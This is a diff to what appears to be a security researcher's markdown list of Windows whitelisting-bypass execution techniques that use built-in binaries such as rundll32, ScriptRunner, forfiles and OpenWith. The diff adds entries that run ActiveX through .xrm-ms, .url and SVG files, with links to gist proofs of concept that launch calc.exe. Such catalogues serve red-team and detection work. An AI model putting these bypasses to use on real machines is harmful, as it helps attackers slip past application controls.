@@ -38,7 +38,7 @@ setupapi.dll,InstallHinfSection DefaultInstall 132 C:\INFPS.inf
 https://gist.githubusercontent.com/homjxi0e/a27e34d7be34731fb637e820c883c8bc/raw/1414b5efd3f1c35d56382b1a1dfe7b455f1fe9bc/INFPS.inf
 ```
 
-( 6 ) DLL Execution Using ( Wave.Reflection ) In CPLEx AccessibilityCPL RegServer
+( 6 ) DLL Execution Using ( Reflection ) In CPLEx AccessibilityCPL RegServer
 ```
 &- Add Values in HKLM Name File ms-settings in Open/Shell/Command
 &- rundll32 accessibilitycpl.dll,DllRegisterServer 
@@ -98,7 +98,7 @@ forfiles.exe /c calc.exe
  https://gist.github.com/homjxi0e/95aeb250b5290b27804cbe983af91085
 ```
 
-( 10v5 )ScriptRunner.exe Execution 
+( 10v5 ) ScriptRunner.exe Execution 
 ```
 ScriptRunner.exe -appvscript C:\Windows\System32\calc.exe
 ```
@@ -122,6 +122,24 @@ rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication calc.exe
 Whitelisting SRP Bypassing Using OpenWith.exe To Launch HTA/MSI Execution 
 &- OpenWith.exe /c C:\test.hta 
 &- OpenWith.exe /c C:\testing.msi
+```
+( 10v11 )  XrML Digital License (.xrm-ms) ActiveX
+
+```
+iexplorer C:\test.xrm-ms 
+https://gist.github.com/homjxi0e/099d8f35f3b2e1b7daa7cbe366df1ed3
+ 
+```
+( 10v12 ) 
+```
+start C:\obj.url
+https://gist.github.com/homjxi0e/0023a9cb5d4fee198019f87bd348effc
+```
+( 10 v13 ) ActiveX executing using a SVG Document 
+```
+iexplorer C:\PoC.svg
+https://gist.github.com/homjxi0e/4a38b2402e77a536a4deb17928f9a8b0
+
 ```
 
 (Note) Product Via @bohops
